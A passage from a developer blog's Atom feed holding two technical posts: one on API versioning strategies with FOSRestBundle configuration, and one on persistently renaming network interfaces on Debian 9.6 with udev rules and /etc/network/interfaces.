            <title type="html"><![CDATA[API versionning strategies]]></title>
            <link href="/blog/2018/12/11/api-versionning/"/>
            <updated>2018-12-11T17:04:00+01:00</updated>
            <id>/blog/2018/12/11/api-versionning/</id>
            <content type="html"><![CDATA[<h2 id="context">Context</h2>

<p>API are like any other programmed systems : they evolve during time, either with bugfixes or feature addition. There is a roadmap that can eventually bring to a <strong>backward compatibility break</strong> to ensure proper evolution regarding new features.</p>

<h2 id="versionning">Versionning</h2>

<p>Versionning is important, mainly to provide your API clients ways to ensure they use the proper version regarding their needs.</p>

<p>Few ways : 
 - Domain name : <code>https://v4.your-api.com</code>
 - URI prefix : <code>https://your-api.com/api/v4</code>
 - Query string : <code>https://your-api.com/api/?v=4.0.0</code>
 - Custom HTTP header : <code>X-API-Version: 4.0.0</code>
 - <code>Accept</code> HTTP header :  <code>Accept: application/vendor.app.your-app+json; version=4.0.0</code></p>

<p>Keep as the rule of thumb than changing URLs are <strong>generally bad idea</strong>. HTTP headers are the way to go. Below is a configuration possibility for the <code>Accept</code> header.</p>

<h2 id="fosrestbundle-configuration-for-%60accept%60-header">FOSRestBundle configuration for <code>Accept</code> header</h2>

<p>2 keys to add to FOSRestBundle configuration : <code>versionning</code> and <code>view:meme_types</code></p>

<h3 id="versionning">Versionning</h3>

<p>You need to tell FOSRestBundle you are using versionning in your app :</p>

<pre><code class="yaml">fos_rest:
  ...
  versioning:
    enabled: true
    resolvers:
      media_type: # Accept header
        enabled: true
        regex: '/(v|version)=(?P&lt;version&gt;[0-9\.]+)/'
</code></pre>

<p>Of course, you an freely adapt the regex to your needs.</p>

<h3 id="add-mime-type">Add MIME type</h3>

<p>As you can see above, the MIME type you send is now custom (<code>application/vendor.app.your-app+json; version=4.0.0</code>). You need to tell FOSRestBundle to accept it :</p>

<pre><code class="yaml">fos_rest:
  ...
  view:
    ...    
    mime_types:
      json: ['application/json', 'application/json;version=1.0', 'application/json;version=2.0']
</code></pre>

<p>For the sake of brevity, I just put the matching configurations key with <code>Accept</code> header.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Interfaces configuration with Debian 9.6]]></title>
            <link href="/blog/2018/11/28/interfaces-configuration-with-debian-9/"/>
            <updated>2018-11-28T17:26:00+01:00</updated>
            <id>/blog/2018/11/28/interfaces-configuration-with-debian-9/</id>
            <content type="html"><![CDATA[<h2 id="context">Context</h2>

<p>As I stated <a href="https://devgiants.fr/blog/2018/11/27/netplan-handling-network/">in my previous post</a>, I changed from ubuntu Server 18.10 to Debian 9.6 for the system I'm building (a router/firewall and application server for home automation). Below ismytraces for interface configuration.</p>

<h2 id="renaming">Renaming</h2>

<p>As I also stated <a href="https://devgiants.fr/blog/2018/11/27/netplan-handling-network/">in my previous post</a>, I need renaming for 2 reasons :
- 5 interfaces (4 LAN + 1 Wifi) : need to know which one I'm using, with <strong>a meaningful way according to my system</strong>.
- To be sure to have <strong>interfaces always linked to the same adapter</strong> (by using MAC address matching).</p>

<h3 id="for-the-session">For the session</h3>

<p>Following code will effectively rename your interface <strong>until next reboot</strong>.</p>

<pre><code>ip link set eth0 down
ip link set eth0 name your_new_name
ip link set your_new_name up
</code></pre>

<p>Quite useless on a production usage.</p>

<h3 id="definitely">Definitely</h3>

<p>The persistent solution goes through 2 steps :</p>

<h4 id="70-persistent-net.rules">70-persistent-net.rules</h4>

<p>This is a file (normally) generated by <code>/lib/udev/write_net_rules</code>, a command-line tool from <a href="https://www.debian.org/doc/manuals/debian-reference/ch03.en.html#_the_udev_system">with udev system</a>. I said normally becasue on my fresh Debian install, it's not here. I created one from examples found on the web :</p>

<pre><code>/etc/udev/rules.d/70-persistent-net.rules
# This file was automatically generated by the /lib/udev/write_net_rules
# program, run by the persistent-net-generator.rules rules file.
#
# You can modify it, as long as you keep each rule on a single
# line, and change only the value of the NAME= key.

SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="00:11:22:33:44:55", ATTR{type}=="1", NAME="wan"
</code></pre>

<p>So just replace your MAC address above, and the mathcing interface will take the given name.</p>

<h4 id="%2Fetc%2Fnetwork%2Finterfaces">/etc/network/interfaces</h4>

<p>Next step is to adjust interface declaration in <code>/etc/network/interfaces</code>. For my case, so far it is :</p>

<pre><code># The primary network interface
allow-hotplug wan
iface wan inet dhcp
</code></pre>

<p>Now, my <code>wan</code> interface, which will be linked to my 4G modem, will be the wan entry for all the system. The 4G router will allow address with DHCP, according to configuration done above.</p>

<p>Next steps to come :
- Create LAN interface with another available adapter
- Configure Wifi interface as an Access Point
- Setup a DHCP server for both
- Traffic forwarding from LAN/Wifi to WAN
- Setup a DNS server
- Firewall both ways</p>

<p>Stay tuned !</p>
]]></content>
        </entry>
    </feed>